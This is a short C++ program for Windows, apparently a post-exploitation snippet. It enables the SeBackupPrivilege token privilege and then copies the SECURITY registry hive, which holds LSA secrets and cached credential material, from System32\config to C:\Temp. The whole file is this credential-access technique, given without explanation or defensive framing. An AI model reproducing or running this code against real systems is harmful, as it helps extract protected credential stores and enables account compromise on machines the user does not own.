#include <windows.h>
#include <stdio.h>
#include <iostream>
#pragma comment(lib, "advapi32.lib")

BOOL EnableBackupPrivilege()
{
	HANDLE hToken = NULL;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return FALSE;

	TOKEN_PRIVILEGES tkp;
	LookupPrivilegeValue(NULL, SE_BACKUP_NAME, &tkp.Privileges[0].Luid);

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bOk = AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
	CloseHandle(hToken);

	return bOk;

}

int main() {
	
	std::cout << EnableBackupPrivilege() << std::endl;
	std::cout << CopyFile(L"c:\\Windows\\System32\\config\\SECURITY", L"c:\\Temp\\SECURITY", TRUE) << std::endl;
	return 0;
}
